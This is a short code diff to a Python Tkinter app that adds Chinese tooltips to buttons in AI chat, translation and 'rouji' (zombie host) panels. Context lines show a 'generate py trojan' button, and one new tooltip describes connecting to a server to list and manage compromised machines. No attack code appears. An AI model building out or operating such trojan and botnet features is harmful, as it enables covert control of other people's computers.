@@ -1622,6 +1622,7 @@ def create_ai_ask():
 
     # 创建发送按钮
     send_button = Button(ai_frame, text="发送", command=lambda: on_send(text_box, chat_box))
+    ui_theme.make_tooltip(send_button, "发送消息给当前 AI（Shift+Enter 亦可发送）")
     send_button.grid(row=1, column=1, padx=10, pady=5, sticky="ew")
 
     setup_chat_box(chat_box)
@@ -1801,6 +1802,7 @@ def create_ai_ask_two():
 
     # 创建发送按钮
     send_button = Button(ai_frame, text="发送", command=lambda: on_sent_two(ai_two_names[0], ai_two_names[1]))
+    ui_theme.make_tooltip(send_button, "同时向两个 AI 发送并对比回答（Shift+Enter 亦可）")
     send_button.grid(row=1, column=2, padx=10, pady=5, sticky="ew")
 
     setup_chat_box(left_chat_box)
@@ -1903,6 +1905,7 @@ def baidu_fanyi():
 
     # 创建翻译按钮
     translate_button = Button(fanyi_frame, text="翻译", command=on_translate_click)
+    ui_theme.make_tooltip(translate_button, "翻译输入框文本；需 config/baidu.py 配置百度翻译凭证")
     translate_button.grid(row=5, column=0, pady=10)
 
     # 绑定绑定文本框获取与失去焦点事件提示语
@@ -2368,6 +2371,7 @@ def rouji_panel():
     server_Port_entry.grid(row=1, column=3, padx=(10, 0), sticky='w')  # 紧随label之后
 
     button1 = Button(nav_frame_two, text="连接服务端", command=muma_listen_setting)
+    ui_theme.make_tooltip(button1, "连接 server.py 服务端并列出 / 管理肉鸡")
     button1.grid(row=1, column=4, padx=(10, 50),sticky="w")
 
     button2 = Button(nav_frame_two, text="生成py木马", command=add_py_muma)
